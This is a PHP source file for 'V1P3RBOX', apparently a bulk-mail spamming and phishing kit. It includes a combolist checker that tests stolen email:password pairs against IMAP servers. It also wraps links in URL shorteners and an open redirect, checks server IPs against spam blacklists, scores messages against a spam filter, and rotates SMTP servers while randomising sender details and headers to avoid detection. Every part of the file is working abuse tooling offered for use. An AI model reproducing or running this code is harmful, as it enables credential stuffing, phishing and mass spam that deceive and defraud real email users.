<?php
/*========================================================================================
* +-+-+-+-+-+ Project    : V1P3RBOX
* |V|1|P|3|R| Author     : V1P3Rツ
* +-+-+-+-+-+ Version    : V4
========================================================================================*/
  
  /* Require Files */
  if(isset($sessionId)):

    require_once './includes/SMTP.php';

    require_once './includes/PHPMailer.php';

  endif;
  
  /* 
  * Trim Function
  */function V1P3R_Trim($string){

    return stripslashes(ltrim(rtrim($string)));

  }

  /* 
  * Random Function
  */function V1P3R_Random($value) {

    $regex = '/\[\[([a-zA-Z0-9\-]+)\{([0-9]+)\}\]\]/';

    if (preg_match($regex, $value)):

      $value = preg_replace_callback($regex, function ($matches) {
          
        $str = $matches[0];
        $pattern = explode('{', $str)[0];
        $length = intval(explode('}', explode('{', $str)[1])[0]);
        $characters = '';
        $string = '';

        if (strpos($pattern, '09') !== false) $characters .= '0123456789';

        if (strpos($pattern, 'az') !== false) $characters .= 'abcdefghijklmnopqrstuvwxyz';
        
        if (strpos($pattern, 'AZ') !== false) $characters .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';

        for ($i = 0; $i < $length; $i++):
          
          $string .= $characters[rand(0, strlen($characters) - 1)];
        
        endfor;

        return $string;

      }, $value);

    endif;

    return $value;

  }

  /* 
  * Prepar URL Function
  */function V1P3R_PrepareUrl($url, $useShortener, $openRedirect){

    switch ($useShortener):

      case 'Shorturl.at':

        $url    = $url . '?id=' . uniqid();

        $fields = http_build_query(

          array(
            'u' => $url
          )

        );

        $httpheader = array(

          'http' =>

            array(
              'method'  => 'POST',
              'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
              'content' => $fields
            )

        );

        $context = stream_context_create($httpheader);

        $result  = file_get_contents('https://www.shorturl.at/shortener.php', false, $context);

        preg_match('~(?<=<input id="shortenurl" type="text" value=")(.*?)(?=")~', $result, $url);

        $url = $url[0];

        break;

      default: break;

    endswitch;

    $url = $url . '#' . md5(uniqid(rand(), true));

    switch ($openRedirect):

      case 'Href':

        $url = 'https://href.li/?' . $url;

        break;

      default: break;

    endswitch;

    return $url;

  }

  /* 
  * Bounce Remover Function
  */function V1P3R_Bounce($data){

    $url    = $data['url'];

    $email  = $data['email'];

    $fields = http_build_query(

      array(

        'email' => $email
      
      )

    );

    $httpheader = array(

      'http' =>

        array(
          'method'  => 'POST',
          'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
          'content' => $fields
        )

    );

    $context  = stream_context_create($httpheader);

    $result   = file_get_contents($url, false, $context);

    $response = (strpos($result, 'VALID EMAIL ADDRESS') !== false) ? 'Valid' : 'Invalid';

    return  array(

              'email'    => $email,

              'response' => $response

            );

  }

  /* 
  * IP Blacklist Function
  */function V1P3R_Blacklist($ServerIP){

    $dnsbl_lookup = array(

      'all.s5h.net', 'b.barracudacentral.org', 'bl.spamcop.net', 'blacklist.woody.ch', 'bogons.cymru.com', 'cbl.abuseat.org', 'cdl.anti-spam.org.cn', 'combined.abuse.ch', 'db.wpbl.info', 'dnsbl-1.uceprotect.net', 'dnsbl-2.uceprotect.net', 'dnsbl-3.uceprotect.net', 'dnsbl.anticaptcha.net', 'dnsbl.dronebl.org', 'dnsbl.inps.de', 'dnsbl.sorbs.net', 'drone.abuse.ch', 'duinv.aupads.org', 'dul.dnsbl.sorbs.net', 'dyna.spamrats.com', 'dynip.rothen.com', 'http.dnsbl.sorbs.net', 'ips.backscatterer.org', 'ix.dnsbl.manitu.net', 'korea.services.net', 'misc.dnsbl.sorbs.net', 'noptr.spamrats.com', 'orvedb.aupads.org', 'pbl.spamhaus.org', 'proxy.bl.gweep.ca', 'psbl.surriel.com', 'relays.bl.gweep.ca', 'relays.nether.net', 'sbl.spamhaus.org', 'short.rbl.jp', 'singular.ttk.pte.hu', 'smtp.dnsbl.sorbs.net', 'socks.dnsbl.sorbs.net', 'spam.abuse.ch', 'spam.dnsbl.anonmails.de', 'spam.dnsbl.sorbs.net', 'spam.spamrats.com', 'spambot.bls.digibase.ca', 'spamrbl.imp.ch', 'spamsources.fabel.dk', 'ubl.lashback.com', 'ubl.unsubscore.com', 'virus.rbl.jp', 'web.dnsbl.sorbs.net', 'wormrbl.imp.ch', 'xbl.spamhaus.org', 'z.mailspike.net', 'zen.spamhaus.org', 'zombie.dnsbl.sorbs.net'

    );

    $listed = '';

    $clean  = '';

    if($ServerIP):
      
      $reverse_ip = implode('.', array_reverse(explode('.', $ServerIP)));
    
      foreach($dnsbl_lookup as $host):
    
        if(checkdnsrr($reverse_ip . '.' . $host . '.', 'A')):
    
          $listed .= '<tr class="negative">
              
                        <td>

                          ' . $ServerIP . ' 
                        
                        </td>

                        <td>

                          ' . $host . '

                        </td>

                        <td class="center aligned">
                          
                          <i class="large red exclamation triangle icon"></i>
                        
                        </td>

                        <td></td>

                      </tr>';
    
        else:

          $clean .= '<tr class="positive">
              
                        <td>

                          ' . $ServerIP . ' 
                        
                        </td>

                        <td>

                          ' . $host . '

                        </td>

                        <td></td>

                        <td class="center aligned">
                          
                          <i class="large green checkmark icon"></i>
                        
                        </td>

                      </tr>';
    
        endif;

        ob_flush();

        flush();
    
      endforeach;
    
    endif;

    return (empty($listed)) ? '<tr><td colspan="4">"A" record was not found</td></tr>' : $listed . $clean;

  }

  /* 
  * Combolist Checker Function
  */function V1P3R_Combo($data){

    $acces  = $data['acces'];

    $server = $data['server'];

    $port   = $data['port'];

    list($email, $password) = explode(':', $acces, 2);

    $init = curl_init();

    curl_setopt_array($init, array(
      
      CURLOPT_URL            => (($port == 993) ? 'imaps' : 'imap') . '://' . $server,
      
      CURLOPT_PORT           => $port,
      
      CURLOPT_USERNAME       => $email,
      
      CURLOPT_PASSWORD       => $password,
      
      CURLOPT_RETURNTRANSFER => true,
      
      CURLOPT_HEADER         => true,
      
      CURLOPT_ENCODING       =>  ''
    
    ));

    $result = curl_exec($init);

    curl_close($init);

    return  array(

              'email'    => $acces,

              'response' => (is_string($result)) ? 'Valid' : 'Invalid'

            );

  }

  /* 
  * Check Send Score Function
  */function V1P3R_CheckScore($messageHeaders){

    $array      = array();

    $httpheader = array(
  
      'http' =>
  
        array(
        
          'method'  => 'POST',
        
          'header'  => 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
        
          'content' => http_build_query(array('email' => $messageHeaders, 'options' => 'long'))
        
        )
  
    );
  
    $context   = stream_context_create($httpheader);
  
    $response  = file_get_contents('https://spamcheck.postmarkapp.com/filter', false, $context);
  
    preg_match("/(?<=\"success\":).*?(?=,)/", $response, $success);
    
    if($success[0] == true):
  
      preg_match("/(?<=\"score\":\").*?(?=\")/", $response, $score);
  
      preg_match("/(?<=\"report\":\").*?(?=\")/", $response, $report);
    
      $array['score']  = $score[0];

      $array['report'] = '<pre>' . str_replace('\n', '</br>', $report[0]) . '</pre>';
    
    else:
  
      $array['error'] = 'True';
  
    endif;
  
    return $array;

  }

  /* 
  * PreSend Function
  */function V1P3R_PreSend($mail, $fromNameEncoding, $fromName, $fromMail, $replyTo, $returnPath, $confirmReading, $subjectEncoding, $subject, $date, $encoding, $contentType, $charset, $priority, $headers){

    /* Add Confirm Reading */
    if($confirmReading) $mail->ConfirmReadingTo = $returnPath;

    /* From Name Encoding */
    switch($fromNameEncoding):

      case '7bit':

        $fromName  = iconv(mb_detect_encoding($fromName, 'auto'), 'UTF-8', $fromName);

        break;

      case 'base64':

        $fromName = '=?UTF-8?B?' . base64_encode($fromName) . '?=';

        break;

      case 'binary':

        $fromName = imap_base64(imap_binary($fromName));

        break;

      case 'quoted-printable':

        $fromName = '=?UTF-8?Q?' . quoted_printable_encode($fromName) . '?=';

        break;

      default: break;

    endswitch;

    /* Subject Encoding */
    switch ($subjectEncoding):

      case '7bit':

        $subject  = iconv(mb_detect_encoding($subject, 'auto'), 'UTF-8', $subject);

        break;

      case 'base64':

        $subject  = '=?UTF-8?B?' . base64_encode($subject) . '?=';

        break;

      case 'binary':

        $subject  = imap_base64(imap_binary($subject));

        break;

      case 'quoted-printable':

        $subject = '=?UTF-8?Q?' . quoted_printable_encode($subject) . '?=';

        break;

      default: break;

    endswitch;

    /* Add Mail Config */
    $mail->setFrom($fromMail, $fromName);

    $mail->AddReplyTo($replyTo, $fromName);

    $mail->Sender      = $returnPath;

    $mail->Subject     = $subject;

    $mail->MessageDate = ($date != '0') ? 

                            date('D, j M Y H:i:s O', strtotime(date('Y-m-d') . ' + ' . $date . ' days')) 
                          
                          : 

                            PHPMailer::rfcDate();

    $mail->Encoding    = $encoding;

    $mail->ContentType = $contentType;

    $mail->CharSet     = $charset;

    $mail->Priority    = $priority;

    $mail->XMailer     = ' ';
    
    /* Add Custom Headers */
    if(!empty($headers)):
      
      foreach (preg_split('/[\r\n]+/', $headers) as $row):

        if(!empty($row)):

          list($headerName, $headerValue) = explode(': ', $row, 2);

          switch ($headerName):

            case 'Message-ID':

              $mail->MessageID = $headerValue;
              
              break;

            case 'X-Mailer':

              $mail->XMailer = $headerValue;
              
              break;

            default:

              $mail->addCustomHeader($headerName, $headerValue);
              
              break;

          endswitch;

        endif;

      endforeach;

    endif;

  }

  /* 
  * Send Function
  */function V1P3R_Send($to, $mail, $cid, $link, $useShortener, $openRedirect, $letter, $local){

    /* Add HTML And Plain Text Message */
    $mail->msgHTML(

      preg_replace('/\[\[email\]\]/', (is_string($to)) ? $to : '', 

        preg_replace('/\[\[user\]\]/', (is_string($to)) ? explode('@', $to)[0] : '', 
        
          preg_replace('/\[\[image\]\]/', (strpos($cid, 'data:') !== false) ? $cid : "cid:$cid", 
          
            preg_replace('/\[\[link\]\]/', V1P3R_PrepareUrl($link, $useShortener, $openRedirect), $letter)

          )

        )

      )
    
    );

    /* Sending And Testing */
    if(!$mail->Send()):
  
      if($local):

        $mail->IsMail();

        if(!$mail->Send()):

          $response = $mail->ErrorInfo;

        else:

          $response = 'Done';

        endif;

      else:

        $response = $mail->ErrorInfo;

      endif;

    else:

      $response = 'Done';

    endif;

    return $response;

  }

  /* 
  * Start Send Function
  */function V1P3R_StartSend($sessionId, $data){

    $debug            = $data['debug'];

    $serverList       = !empty($data['server']) ? $data['server'] : '';

    $pause            = isset($data['pause']) ? intval(V1P3R_Trim($data['pause'])) : '';
    
    $pauseAfter       = isset($data['pauseAfter']) ? intval(V1P3R_Trim($data['pauseAfter'])) : '';

    $rotation         = isset($data['rotation']) ? intval(V1P3R_Trim($data['rotation'])) : '';

    $reconnect        = isset($data['reconnect']) ? intval(V1P3R_Trim($data['reconnect'])) : '';

    $randomAfter      = isset($data['randomSend']) ? intval(V1P3R_Trim($data['randomSend'])) : '';

    $concurrency      = $data['concurrency'];

    $fromNameEncoding = $data['fromNameEncoding'];

    $bccName          = $bccName_base  = V1P3R_Trim($data['bccName']);

    $bccMail          = $bccMail_base  = V1P3R_Trim($data['bccMail']);

    $fromName         = $fromName_base = V1P3R_Trim($data['fromName']);

    $fromMail         = $fromMail_base = V1P3R_Trim($data['fromMail']);

    $subject          = $subject_base  = V1P3R_Trim($data['subject']);

    $subjectEncoding  = $data['subjectEncoding'];

    $replyTo          = $replyTo_base    = V1P3R_Trim($data['replyTo']);

    $returnPath       = $returnPath_base = V1P3R_Trim($data['returnPath']);

    $emailAsLogin     = (!empty($data['emailAsLogin'])) ? true : false;

    $replyAsLogin     = (!empty($data['replyAsLogin'])) ? true : false;

    $confirmReading   = (!empty($data['confirmReading'])) ? true : false;

    $headers          = $headers_base = V1P3R_Trim($data['headers']);

    $link             = $link_base    = V1P3R_Trim($data['link']);

    $embedIMG         = isset($data['embedIMG']) ? $data['embedIMG'] : '';

    $embedType        = !empty($data['embedType']) ? $data['embedType'] : '';

    $attachments      = isset($data['attachments']) ? $data['attachments'] : '';

    $openRedirect     = $data['openRedirect'];

    $useShortener     = $data['useShortener'];

    $letter           = $letter_base = V1P3R_Trim($data['letter']);

    $recipients       = $data['recipients'];

    $isBCC            = $data['isBCC'];

    $date             = $data['date'];

    $contentType      = $data['contentType'];

    $charset          = $data['charset'];

    $encoding         = $data['encoding'];

    $priority         = $data['priority'];

    $cid              = 'attachment_' . uniqid();

    $response         = array();

    $count            = ($concurrency == 1) ? count($recipients) : 0;

    $curentSMTP       = 0;

    $round            = 0;

    /* Create A New PHPMailer Instance */
    $mail             = new PHPMailer;

    /* 
    * SwitchSMTP Function
    */function V1P3R_SwitchSMTP($mail, $concurrency, $debug, $curentSMTP, $serverList, $emailAsLogin, $replyAsLogin, $fromMail, $returnPath, $replyTo){

      $mail->SMTPDebug   = $debug;

      if($debug != '0'):

        $mail->Debugoutput = function($str, $level) {
        
          $GLOBALS['debug'] .= '[' . gmdate('H:i:s') . '] ' .  $str . '</br>';
        
        };

      endif;
      
      if(count($serverList) > $curentSMTP):

        $server = explode(':', $serverList[$curentSMTP]);

        $mail->Host        = $server[0];

        $mail->Port        = $server[1];

        $mail->SMTPSecure  = (in_array(strtolower($server[2]), array('ssl', 'tls'))) ? strtolower($server[2]) : '';

        $mail->SMTPKeepAlive = ($concurrency == 1) ? true : false;

        if(count($server) > 0 && count($server) > 3):

          $mail->SMTPAuth   = true;

          $mail->Username   = $server[3];

          $mail->Password   = $server[4];

        endif;

        if($emailAsLogin):

          $fromMail = $server[3];

          $returnPath = $server[3];

        endif;

        if($replyAsLogin || $emailAsLogin) $replyTo = $server[3];

      endif;

      return [$fromMail, $returnPath, $replyTo];
    
    }

    /* Tell PHPMailer To Use Sendmail Or SMTP */
    if(empty($serverList) || empty($serverList[0])):

      $local = true;

      $mail->IsSendmail();

    else:

      $local = false;

      $mail->IsSMTP();

      list($fromMail, $returnPath, $replyTo) = V1P3R_SwitchSMTP($mail, $concurrency, $debug, $curentSMTP, $serverList, $emailAsLogin, $replyAsLogin, $fromMail, $returnPath, $replyTo);

    endif;

    /* Embed Image */
    if(!empty($embedIMG)):

      preg_match("':(.*?);'si", $embedIMG, $type);

      if(empty($embedType)):

        $type     = $type[1];

        $dataURI  = explode('base64,', $embedIMG)[1];

        $filename = $cid . '.' . explode('/', $type)[1];

        $mail->addStringEmbeddedImage(base64_decode($dataURI), $cid, $filename, 'base64', $type);

      else:

        $type = explode('/', $type[1])[1];

        $cid  = str_replace($type,  md5(uniqid(rand(), true)) . $type, $embedIMG);

      endif;

    endif;

    /* Add Attachement */
    if(!empty($attachments)):

      foreach ($attachments as $index => $value):

        preg_match("':(.*?);'si", $value, $type);

        $type     = $type[1];

        $dataURI  = explode('base64,', $value)[1];

        $filename = $cid . '_' . $index . '.' . explode('/', $type)[1];

        $mail->AddStringAttachment(base64_decode($dataURI), $filename, 'base64', $type);

      endforeach;

    endif;

    /* Check Mail Score */
    if(isset($data['CheckScore'])):

      V1P3R_PreSend($mail, $fromNameEncoding, $fromName, $fromMail, $replyTo, $returnPath, $confirmReading, $subjectEncoding, $subject, $date, $encoding, $contentType, $charset, $priority, $headers);

      $mail->addAddress($sessionId . '@email.com');

      $mail->msgHTML($letter);

      $mail->preSend();

      $response = V1P3R_CheckScore($mail->getSentMIMEMessage());

    /* Send With Pool Connexion */
    elseif($concurrency == 1):

      if(!$emailAsLogin):

        $fromMail      = V1P3R_Random($fromMail);

        $returnPath    = V1P3R_Random($returnPath);

        if(!$replyAsLogin) $replyTo = V1P3R_Random($replyTo);

      endif;

      $bccName       = V1P3R_Random($bccName);

      $bccMail       = V1P3R_Random($bccMail);

      $fromName      = V1P3R_Random($fromName);

      $subject       = V1P3R_Random($subject);

      $headers       = V1P3R_Random($headers);

      $link          = V1P3R_Random($link);

      $letter        = V1P3R_Random($letter);

      $pauseSend     = false;

      $rotatSend     = false;

      $reconnectSMTP = false;

      $randomSend    = false;

      if(!empty($pause) && !empty($pauseAfter) && $pauseAfter < $count):

        $pauseSend = true;

      endif;

      if(!empty($rotation) && $rotation < $count && count($serverList) > 1):

        $rotatSend = true;

      endif;

      if(!empty($reconnect) && $reconnect < $count):

        $reconnectSMTP = true;

      endif;

      if(!empty($randomAfter) && $randomAfter < $count):

        $randomSend = true;
        
      endif;
      
      V1P3R_PreSend($mail, $fromNameEncoding, $fromName, $fromMail, $replyTo, $returnPath, $confirmReading, $subjectEncoding, $subject, $date, $encoding, $contentType, $charset, $priority, $headers);

      foreach ($recipients as &$to):

        if($isBCC):

          foreach ($to as &$value) $mail->addBCC($value);
    
          $mail->AddAddress(
    
            $bccMail,
    
            '=?UTF-8?B?' . base64_encode($bccName) . '?='
    
          );
    
        else:
    
          $mail->AddAddress($to);
    
        endif;

        /* Random Send Data */
        if($randomSend && $round != 0 && $round < $count && ($round % $randomAfter == 0)):

          if(!$emailAsLogin):

            $fromMail      = V1P3R_Random($fromMail_base);

            $returnPath    = V1P3R_Random($returnPath_base);

            if(!$replyAsLogin) $replyTo = V1P3R_Random($replyTo_base);

          endif;

          $bccName       = V1P3R_Random($bccName_base);

          $bccMail       = V1P3R_Random($bccMail_base);

          $fromName      = V1P3R_Random($fromName_base);

          $subject       = V1P3R_Random($subject_base);

          $headers       = V1P3R_Random($headers_base);

          $link          = V1P3R_Random($link_base);

          $letter        = V1P3R_Random($letter_base);

          V1P3R_PreSend($mail, $fromNameEncoding, $fromName, $fromMail, $replyTo, $returnPath, $confirmReading, $subjectEncoding, $subject, $date, $encoding, $contentType, $charset, $priority, $headers);

          array_push(

            $response,

            array(

              'to'       => $to,
              
              'response' => 'Generate Random Data To Continue Sending.',

              'debug'    => $GLOBALS['debug']

            )

          );

        endif;

        /* Sending And Testing */
        array_push(

          $response,
          
          array(

            'to'       => $to,

            'subject'  => $subject,
            
            'response' => V1P3R_Send($to, $mail, $cid, $link, $useShortener, $openRedirect, $letter, $local),

            'debug'    => $GLOBALS['debug']

          )

        );

        $round++;

        /* SMTP Reconnection */
        if($reconnectSMTP && $round != 0 && $round < $count && ($round % $reconnect == 0)):

          $mail->SmtpClose();

          array_push(

            $response,

            array(

              'to'       => $to,
              
              'response' => 'SMTP Closed And Attempts To Reconnect New Connection.',

              'debug'    => $GLOBALS['debug']

            )

          );

        endif;

        $mail->clearAllRecipients();
        
        $mail->clearReplyTos();

        /* SMTP Rotation */
        if($rotatSend && $round != 0 && $round < $count && ($round % $rotation == 0)):

          $curentSMTP = ($curentSMTP == (count($serverList) - 1)) ? 0 : $curentSMTP + 1;

          $mail->SmtpClose();
          
          list($fromMail, $returnPath, $replyTo) = V1P3R_SwitchSMTP($mail, $concurrency, $debug, $curentSMTP, $serverList, $emailAsLogin, $replyAsLogin, $fromMail, $returnPath, $replyTo);

          array_push(

            $response,

            array(

              'to'       => $to,
              
              'response' => 'Rotate To SMTP Nr. ' . ($curentSMTP + 1) . ' Host: ' . $mail->Host . '.',

              'debug'    => $GLOBALS['debug']

            )

          );
          
        endif;

        /*Waiting Pause Time*/
        if($pauseSend && $round != 0 && $round < $count && ($round % $pauseAfter == 0)):

          array_push(

            $response,

            array(

              'to'       => $to,
              
              'response' => 'Waiting ' . $pause . ' Sec To Continue Sending.',

              'debug'    => $GLOBALS['debug']

            )

          );

          sleep($pause);

        endif;

      endforeach;

    /* Send With Concurrency Connexion */
    else:

      $headers  = preg_replace('/\[\[email\]\]/', (is_string($recipients)) ? $recipients : '',

                    preg_replace('/\[\[user\]\]/', (is_string($recipients)) ? explode('@', $recipients)[0] : '', $headers)

                  );

      $fromName = preg_replace('/\[\[email\]\]/', (is_string($recipients)) ? $recipients : '',
               
                    preg_replace('/\[\[user\]\]/', (is_string($recipients)) ? explode('@', $recipients)[0] : '', $fromName)

                  );
      
      $subject  = preg_replace('/\[\[email\]\]/', (is_string($recipients)) ? $recipients : '',
               
                    preg_replace('/\[\[user\]\]/', (is_string($recipients)) ? explode('@', $recipients)[0] : '', $subject)

                  );
      
      V1P3R_PreSend($mail, $fromNameEncoding, $fromName, $fromMail, $replyTo, $returnPath, $confirmReading, $subjectEncoding, $subject, $date, $encoding, $contentType, $charset, $priority, $headers);

      if($isBCC):

        foreach ($recipients as &$value) $mail->addBCC($value);
  
        $mail->AddAddress(
  
          $bccMail,
  
          '=?UTF-8?B?' . base64_encode($bccName) . '?='
  
        );
  
      else:
  
        $mail->AddAddress($recipients);
  
      endif;

      /* Sending And Testing */
      array_push(

        $response,

        array(

          'to'       => $recipients,

          'subject'  => $subject,
          
          'response' => V1P3R_Send($recipients, $mail, $cid, $link, $useShortener, $openRedirect, $letter, $local),

          'debug'    => $GLOBALS['debug']

        )

      );

    endif;

    $mail->clearAttachments();

    $mail->SmtpClose();

    /* Return Send Response */
    return $response;
    
  }

?>
